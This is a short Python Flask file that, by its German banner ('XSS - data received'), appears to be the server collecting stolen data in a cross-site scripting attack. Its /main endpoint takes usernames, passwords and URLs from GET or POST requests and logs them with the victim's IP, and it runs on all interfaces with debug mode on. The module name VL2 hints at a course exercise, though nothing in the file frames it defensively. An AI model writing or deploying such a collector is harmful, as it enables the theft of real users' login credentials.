from VL2 import app
from flask import request 

@app.route("/main", methods=["GET", "POST"])
def main():
    print("\n" + "="*80)
    print("🔥 XSS - DATEN EMPFANGEN")
    print("="*80)
    
    if request.method == "POST":
        try:
            data = request.get_json(silent=True) or {}
            print("Username:", data.get("username"))
            print("Password:", data.get("password"))
            print("URL:", data.get("url"))
        except:
            pass
    else:
        print("Username:", request.args.get("username"))
        print("Password:", request.args.get("password"))
    
    print("IP:", request.remote_addr)
    print("="*80 + "\n")
    
    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=True)

# python -m VL2.cookie